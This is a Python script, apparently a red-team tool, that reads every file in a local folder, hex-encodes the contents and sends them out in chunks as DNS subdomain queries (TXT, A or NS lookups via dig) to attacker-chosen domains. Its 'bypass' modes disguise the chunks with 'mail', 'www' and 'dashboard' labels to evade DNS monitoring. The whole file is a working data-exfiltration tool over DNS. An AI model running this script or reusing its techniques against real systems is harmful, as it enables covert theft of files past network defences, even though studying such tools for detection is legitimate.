########################################################################################
#author: @mel4mi
#version: 1.1
#description: This script is a simple data sender script that sends data to subdomains
#date: 2024-12-12
########################################################################################
import os
import subprocess
import base64
import json
import binascii
import time
import argparse
import random
import signal
import sys

########################################################################################
#Read Files
########################################################################################
def find_path():
    path = os.getcwd()
    datas = path + "/TestDatas"
    return datas

def collect_files_path():
    file_path = find_path()
    files = []
    for root, dirs, filenames in os.walk(file_path):
        for file in filenames:
            files.append(os.path.join(root, file))
    return files

def onlyname():
    filename = []
    files = collect_files_path()
    for file in files:
        filename.append(file.split("/")[-1])
    return filename

def file2json(files):
    filesObj = []
    for file in files:
        try:
            with open(file, "r") as f:
                data = f.read()
        except Exception as e:
            print(f"Error reading file: {e}")
            continue
        
        filesObj.append({
            "file": file.split("/")[-1],
            "data": data.strip()
        })
    return filesObj

########################################################################################
#Encryption Methods
########################################################################################
def b64encoder(data): # next future
    encoded = base64.b64encode(data.encode('utf-8')).decode('utf-8')
    return encoded

def xxd_encoder(data):
    hex_data = binascii.hexlify(data.encode()).decode('utf-8')
    formatted_hex = '\n'.join([hex_data[i:i+32] for i in range(0, len(hex_data), 32)])
    return formatted_hex

def low_bypass(data):
    hex_data = binascii.hexlify(data.encode()).decode('utf-8')
    subdomains = ['mail', 'www']
    random.shuffle(subdomains)
    formatted_hex = '\n'.join([f"{subdomains[i % len(subdomains)]}{hex_data[i:i+16]}" for i in range(0, len(hex_data), 16)])
    return formatted_hex

def medium_bypass(data, max_length=63): # you can change the max_length value, max is 63
    hex_data = binascii.hexlify(data.encode()).decode('utf-8')    
    formatted_hex = '\n'.join([hex_data[i:i+32] for i in range(0, len(hex_data), 32)])
    parts = formatted_hex.split('\n')
    
    subdomains = []
    used_subdomains = set()
    for part in parts:
        subdomain = f"mail{part[:max_length - 14]}dashboard{part[max_length - 14:]}www"        
        if len(subdomain) > max_length:
            subdomain = subdomain[:max_length]
        
        while subdomain in used_subdomains:
            random.shuffle(subdomains)
            subdomain = f"mail{part[:max_length - 14]}dashboard{part[max_length - 14:]}www"
            if len(subdomain) > max_length:
                subdomain = subdomain[:max_length]
        
        used_subdomains.add(subdomain)
        subdomains.append(subdomain)

    return subdomains

########################################################################################
#Query Methods
########################################################################################
def subdomain_query_send(data, domains, encryption_method, mode):
    if encryption_method == 'xxd':
        encoded_subdomain = xxd_encoder(data)
    elif encryption_method == 'low_bypass':
        encoded_subdomain = low_bypass(data)
    elif encryption_method == 'medium_bypass':
        encoded_subdomain = medium_bypass(data)
    else:
        raise ValueError("Invalid encryption method")

    if isinstance(encoded_subdomain, list):
        encoded_subdomain = "\n".join(encoded_subdomain)
    bitlist = encoded_subdomain.split("\n")

    output = []
    count = 1
    for i, bit in enumerate(bitlist):
        domain = random.choice(domains) # choose random domain
        print(f"{count}. Query: {bit}.{domain}")
        if mode == 'TXT':
            command = f"dig +short TXT {bit}.{domain}"
            result = subprocess.run(command, shell=True, capture_output=True)
            output.append(result.stdout.decode('utf-8'))
            time.sleep(1)
        elif mode == 'A':
            command = f"dig +short A {bit}.{domain}"
            result = subprocess.run(command, shell=True, capture_output=True)
            output.append(result.stdout.decode('utf-8'))
            time.sleep(1)
        elif mode == 'NS':
            command = f"dig +short NS {bit}.{domain}"
            result = subprocess.run(command, shell=True, capture_output=True)
            output.append(result.stdout.decode('utf-8'))
            time.sleep(1)
        elif mode == 'RANDOM':
            if i % 2 == 0:
                command = f"dig +short TXT {bit}.{domain}"
                result = subprocess.run(command, shell=True, capture_output=True)
                output.append(result.stdout.decode('utf-8'))
                time.sleep(1)
            else:
                command = f"dig +short A {bit}.{domain}"
                result = subprocess.run(command, shell=True, capture_output=True)
                output.append(result.stdout.decode('utf-8'))
                time.sleep(1)
        count += 1
    return output

########################################################################################
#Main Function
########################################################################################
def GoSubdomain(domains, encryption_method, mode):
    os.system('clear')
    print("#" * 50)
    print("")
    print(f"Domains: {domains}")
    print(f"Subject: Subdomain Data Query")
    print(f"Encryption Method: {encryption_method}")
    print(f"Mode: {mode}")
    print(f"Found Files: {onlyname()}")
    print("")
    print("#" * 50)    
    print("")                                                                                                   

    files = collect_files_path()
    filesObj = file2json(files)
    json_data = json.dumps(filesObj)
    encoded = b64encoder(json_data)

    print("Subdomain Output: ", subdomain_query_send(json_data, domains, encryption_method, mode))

########################################################################################
#Signal Handler
########################################################################################
def signal_handler(sig, frame):
    print('Stopped')
    sys.exit(0)

########################################################################################
#Go
########################################################################################
if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(description='Subdomain Data Query Script')
    parser.add_argument('-d', '--domains', nargs='+', required=True, help='List of domains to distribute data across')
    parser.add_argument('-e', '--encryption', choices=['xxd', 'low_bypass', 'medium_bypass'], required=True, help='Encryption method to use')
    parser.add_argument('-m', '--mode', choices=['TXT', 'A', 'NS', 'RANDOM'], default='TXT', help='Query mode')
    
    try:
        args = parser.parse_args()
        GoSubdomain(args.domains, args.encryption, args.mode)
    except Exception as e:
        print(f"Error: {e}")
        exit(1)